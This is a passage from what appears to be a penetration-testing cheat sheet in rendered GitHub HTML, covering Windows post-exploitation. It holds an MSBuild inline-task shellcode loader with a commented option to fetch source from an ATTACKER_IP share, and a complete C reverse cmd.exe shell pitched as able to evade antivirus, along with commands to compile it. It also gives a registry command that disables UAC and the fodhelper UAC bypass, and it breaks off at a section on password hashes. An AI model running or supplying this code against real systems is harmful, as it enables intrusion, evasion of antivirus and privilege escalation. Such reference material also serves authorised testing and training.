class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-e\"\u003eAssemblyFile\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003eTask\u003c/span\u003e\u0026gt;\n\n      \u0026lt;\u003cspan class=\"pl-ent\"\u003eCode\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eType\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eClass\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eLanguage\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecs\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e to host code remotely, instead use:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e      \u0026lt;Code Type=\"Class\" Language=\"cs\" Source=\"\\\\ATTACKER_IP\\share\\source.cs\"\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e      \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\u0026lt;![CDATA[\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        using System;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        using System.Runtime.InteropServices;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        using Microsoft.Build.Framework;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        using Microsoft.Build.Utilities;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        public class ClassExample :  Task, ITask\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        {\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          private static UInt32 MEM_COMMIT = 0x1000;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          [DllImport(\"kernel32\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          [DllImport(\"kernel32\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            private static extern IntPtr CreateThread(\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 lpThreadAttributes,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 dwStackSize,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 lpStartAddress,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            IntPtr param,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 dwCreationFlags,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            ref UInt32 lpThreadId\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            );\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          [DllImport(\"kernel32\")]\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            private static extern UInt32 WaitForSingleObject(\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            IntPtr hHandle,\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 dwMilliseconds\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            );\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          public override bool Execute()\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          {\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            //PUT YOUR SHELLCODE HERE;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            IntPtr hThread = IntPtr.Zero;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            UInt32 threadId = 0;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            IntPtr pinfo = IntPtr.Zero;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            WaitForSingleObject(hThread, 0xFFFFFFFF);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            return true;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          }\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        }\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e      \u003cspan class=\"pl-pds\"\u003e]]\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u0026lt;/\u003cspan class=\"pl-ent\"\u003eCode\u003c/span\u003e\u0026gt;\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003eTask\u003c/span\u003e\u0026gt;\n  \u0026lt;/\u003cspan class=\"pl-ent\"\u003eUsingTask\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003eProject\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.9 Custom Windows TCP Reverse Shell\u003c/h3\u003e\u003ca id=\"user-content-439-custom-windows-tcp-reverse-shell\" class=\"anchor\" aria-label=\"Permalink: 4.3.9 Custom Windows TCP Reverse Shell\" href=\"#439-custom-windows-tcp-reverse-shell\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eA custom reverse shell can often get past antivirus.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/* Win32 TCP reverse cmd.exe shell\n * References:\n * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons\n * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect\n * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa\n * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\n * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread\n * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)\n */\n#include \u0026lt;winsock2.h\u0026gt;\n#include \u0026lt;ws2tcpip.h\u0026gt;\n\n#pragma comment(lib, \u0026quot;Ws2_32.lib\u0026quot;)\n\n// CHANGE THESE\n#define TARGET_IP   \u0026quot;LISTEN_IP\u0026quot;\n#define TARGET_PORT 443\n\nvoid main(void) {\n  SOCKET s;\n  WSADATA wsa;\n  STARTUPINFO si;\n  struct sockaddr_in sa;\n  PROCESS_INFORMATION pi;\n\n  WSAStartup(MAKEWORD(2,2), \u0026amp;wsa);\n  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n  sa.sin_family = AF_INET;\n  sa.sin_addr.s_addr = inet_addr(TARGET_IP);\n  sa.sin_port = htons(TARGET_PORT);\n  WSAConnect(s, (struct sockaddr *)\u0026amp;sa, sizeof(sa), NULL, NULL, NULL, NULL);\n  SecureZeroMemory(\u0026amp;si, sizeof(si));\n  si.cb = sizeof(si);\n  si.dwFlags = STARTF_USESTDHANDLES;\n  si.hStdInput = (HANDLE)s;\n  si.hStdOutput = (HANDLE)s;\n  si.hStdError = (HANDLE)s;\n  CreateProcessA(NULL, \u0026quot;cmd\u0026quot;, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi);\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e/* Win32 TCP reverse cmd.exe shell\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * References:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e */\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;winsock2.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;ws2tcpip.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003e#pragma\u003c/span\u003e comment(lib, \"Ws2_32.lib\")\n\n\u003cspan class=\"pl-c\"\u003e// CHANGE THESE\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#define\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTARGET_IP\u003c/span\u003e   \"LISTEN_IP\"\n\u003cspan class=\"pl-k\"\u003e#define\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTARGET_PORT\u003c/span\u003e 443\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003emain\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e) {\n  \u003cspan class=\"pl-smi\"\u003eSOCKET\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e;\n  \u003cspan class=\"pl-smi\"\u003eWSADATA\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewsa\u003c/span\u003e;\n  \u003cspan class=\"pl-smi\"\u003eSTARTUPINFO\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e;\n  \u003cspan class=\"pl-k\"\u003estruct\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003esockaddr_in\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e;\n  \u003cspan class=\"pl-smi\"\u003ePROCESS_INFORMATION\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epi\u003c/span\u003e;\n\n  \u003cspan class=\"pl-en\"\u003eWSAStartup\u003c/span\u003e(\u003cspan class=\"pl-en\"\u003eMAKEWORD\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e), \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ewsa\u003c/span\u003e);\n  \u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eWSASocketA\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eAF_INET\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eSOCK_STREAM\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eIPPROTO_TCP\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n  \u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esin_family\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eAF_INET\u003c/span\u003e;\n  \u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esin_addr\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003es_addr\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einet_addr\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eTARGET_IP\u003c/span\u003e);\n  \u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esin_port\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehtons\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eTARGET_PORT\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003eWSAConnect\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e, (\u003cspan class=\"pl-k\"\u003estruct\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003esockaddr\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e)\u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e, \u003cspan class=\"pl-k\"\u003esizeof\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003esa\u003c/span\u003e), \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003eSecureZeroMemory\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e, \u003cspan class=\"pl-k\"\u003esizeof\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e));\n  \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecb\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003esizeof\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e);\n  \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edwFlags\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSTARTF_USESTDHANDLES\u003c/span\u003e;\n  \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehStdInput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003eHANDLE\u003c/span\u003e)\u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e;\n  \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehStdOutput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003eHANDLE\u003c/span\u003e)\u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e;\n  \u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehStdError\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003eHANDLE\u003c/span\u003e)\u003cspan class=\"pl-s1\"\u003es\u003c/span\u003e;\n  \u003cspan class=\"pl-en\"\u003eCreateProcessA\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\"cmd\"\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, TRUE, \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003esi\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003epi\u003c/span\u003e);\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sudo dpkg --add-architecture i386\nsudo apt update\nsudo apt install mingw-w64 wine\ni686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32\"\u003e\u003cpre\u003esudo dpkg --add-architecture i386\nsudo apt update\nsudo apt install mingw-w64 wine\ni686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.3.10 Windows UAC Bypass\u003c/h3\u003e\u003ca id=\"user-content-4310-windows-uac-bypass\" class=\"anchor\" aria-label=\"Permalink: 4.3.10 Windows UAC Bypass\" href=\"#4310-windows-uac-bypass\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnly the local \"Administrator\" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eUAC Enabled registry key (can only modify as admin):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Disabling UAC via registry:\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t DWORD /f /d 0\n\n# Enabling UAC:\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t DWORD /f /d 1\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Disabling UAC via registry:\u003c/span\u003e\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableLUA \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Enabling UAC:\u003c/span\u003e\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableLUA \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBypass Technique:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644\nNew-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value cmd.exe -Force\nNew-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force\nfodhelper\n\n# To undo:\nRemove-Item \u0026quot;HKCU:\\Software\\Classes\\ms-settings\\\u0026quot; -Recurse -Force\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eNew-Item\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath HKCU:\\Software\\Classes\\ms\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esettings\\shell\\open\\command \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eValue \u003cspan class=\"pl-c1\"\u003ecmd.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce\n\u003cspan class=\"pl-c1\"\u003eNew-ItemProperty\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath HKCU:\\Software\\Classes\\ms\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esettings\\shell\\open\\command \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName DelegateExecute \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePropertyType String \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce\nfodhelper\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e To undo:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eRemove-Item\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKCU:\\Software\\Classes\\ms-settings\\\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eRecurse \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4 Windows Passwords \u0026amp; Hashes\u003c/h2\u003e\u003ca id=\"user-content-44-windows-passwords--hashes\" class=\"anchor\" aria-label=\"Permalink: 4.4 Windows Passwords \u0026amp; Hashes\" href=\"#44-windows-passwords--hashes\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWindows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: The empty/blank LM hash value is always \u003ccode\u003eaad3b435b51404eeaad3b435b51404ee\u003c/code\u003e.\nThe empty/blank NT hash value is always \u003ccode\u003e31d6cfe0d16ae931b73c59d7e0c089c0\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003eEncrypted passwords can often be recovered with tools like \u003ca href=\"http://www.nirsoft.net/password_recovery_tools.html\" rel=\"nofollow\"\u003eNirSoft\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.1 Windows Passwords in Files\u003c/h3\u003e\u003ca id=\"user-content-441-windows-passwords-in-files\" class=\"anchor\" aria-label=\"Permalink: 4.4.1 Windows Passwords in Files\" href=\"#441-windows-passwords-in-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 